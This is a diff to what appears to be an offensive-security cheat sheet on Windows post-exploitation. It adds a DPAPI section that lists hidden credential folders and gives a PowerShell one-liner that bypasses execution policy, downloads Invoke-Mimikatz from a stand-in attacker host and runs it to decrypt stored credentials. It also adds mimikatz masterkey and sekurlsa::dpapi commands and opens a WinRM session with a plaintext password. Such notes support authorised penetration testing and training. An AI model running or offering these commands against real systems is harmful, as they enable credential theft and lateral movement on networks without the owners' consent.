@@ -26,9 +26,10 @@ Get-History
 
 # check PSReadline history
 $psReadlineOptions = Get-PSReadlineOption; $historySavePath = $psReadlineOptions.HistorySavePath; if (Test-Path $historySavePath) { Get-Content $historySavePath } else { Write-Host "PS History File does not exist" }
- 
 
-# check contents of this file
+# check event, for blocked scripts for example
+
+Get-WinEvent -FilterHashtable @{logname='Microsoft-Windows-PowerShell/Operational'; ID=4104} | Where-Object { $_.Message -like '*script block*' } | Format-List
 
 # get into temp dir which is typically writable
 cd $env:temp
@@ -253,6 +254,11 @@ Set-ExecutionPolicy Unrestricted
 
 * Primary option: PowerView.ps1
 
+```cmd
+dir /a:h C:\
+dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
+```
+
 ```powershell
 
 . .\PowerView.ps1
@@ -270,6 +276,38 @@ In the users folder look for more extensions
 
 Get-ChildItem -Path .\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
 ```
+
+### DPAPI
+
+```powershell
+
+#find DPAPI credentials
+
+
+Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
+Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
+
+# Get credentials info using mimikatz 
+powershell  -ep Bypass -NoP -NonI -NoLogo -c IEX (New-Object Net.WebClient).DownloadString('https://ip.attqacker/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Command 'dpapi::cred /in:C:\Users\<USER>\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D exit'
+
+# locate guidMasterKey
+
+Get-ChildItem -Hidden C:\Users\<USER>\AppData\Roaming\Microsoft\Protect\<SID>
+
+# make sure to have AD binding
+
+dpapi::masterkey /in:"C:\Users\<USER>\AppData\Roaming\Microsoft\Protect\<USER SID>\<guidMasterKey>" /rpc
+
+# use extracted master key to decrypt credential file
+
+mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D /masterkey:0c0...very long ...f
+
+```
+
+Everything is easy if you are local admin
+
+`sekurlsa::dpapi`
+
 
 ## Recycle Bin // TBD
 
@@ -884,18 +922,8 @@ $password = 'Password!';
 $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
 $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
 
+# Enter-PSSession is alternative
 New-PSSession -ComputerName 192.168.xx.xx -Credential $credential
-
- Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
- -- ----            ------------    ------------    -----         -----------------     ------------
-  1 WinRM1          192.168.xx.xx   RemoteMachine   Opened        
-
-PS C:\Users\jeff> Enter-PSSession 1
-[192.168.50.73]: PS C:\Users\user101\Documents> whoami
-corp\user101
-
-[192.168.50.73]: PS C:\Users\user101\Documents> hostname
-DC001
 
 ```
 
